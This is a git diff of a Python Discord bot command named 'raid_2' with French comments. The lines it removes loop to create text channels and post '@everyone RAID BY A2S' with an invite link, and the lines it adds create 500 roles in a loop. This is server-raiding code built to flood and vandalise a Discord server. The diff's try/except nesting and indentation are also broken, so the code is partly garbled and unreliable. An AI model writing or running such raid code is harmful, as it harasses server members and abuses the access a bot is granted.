@@ -76,27 +76,17 @@ async def raid_2(
     except:
         pass
 
-    # rôles
-    try:
-for i in range(nombre):
-    try:
-        channel = await guild.create_text_channel(name=f"{nom}-{i+1}")
 
-        try:
-            await channel.send("@everyone RAID BY A2S https://discord.gg/vWeekH4BCP ")
-        except:
-            pass
-
+# rôles
+try:
+    for i in range(500):
+        await guild.create_role(name=f"{nom_role}-{i+1}")
         await asyncio.sleep(0.1)
-
-    except:
-        break
-    pass
-    except Exception as e:
-        await interaction.edit_original_response(
-            content=f"❌ Erreur rôles : {e}"
-        )
-        return
+except Exception as e:
+    await interaction.edit_original_response(
+        content=f"❌ Erreur rôles : {e}"
+    )
+    return
 
     # catégorie
     categorie = None
